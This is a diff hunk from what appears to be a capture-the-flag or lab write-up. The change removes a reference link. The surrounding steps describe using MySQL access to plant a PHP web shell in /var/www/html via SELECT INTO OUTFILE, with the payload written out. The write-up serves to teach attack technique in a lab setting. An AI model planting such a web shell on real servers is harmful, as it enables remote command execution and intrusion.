@@ -185,7 +185,7 @@ Looking around we find  data for another user stored in the database.
 ![sql2 index](www_data_sql2.webp){: width="800" height="600" }
 
 Having access to mysql server on `192.168.100.1` we can escape the current docker container and gain access to the host system.
-Using this reference [link](http://scx020c07c.blogspot.com/2012/09/generate-backdoor-via-sql-injection.html) we use the following algorithm to enact this;
+Using the following algorithm to enact this;
 - Create a table with a name of choice under the active database, in this case the active database is DashboardDB, though we can also create our own database, however to ensure the access to the host system and being low-profile we going to use current active database.
 - Then we use "INSERT" statement to insert our php payload --- <?php $cmd=$_GET[“cmd”];system($cmd);?> into the table just created.
 - Next, we use "SELECT" statement with "outfile" feature to dump the php payload to a file --- SELECT <?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php
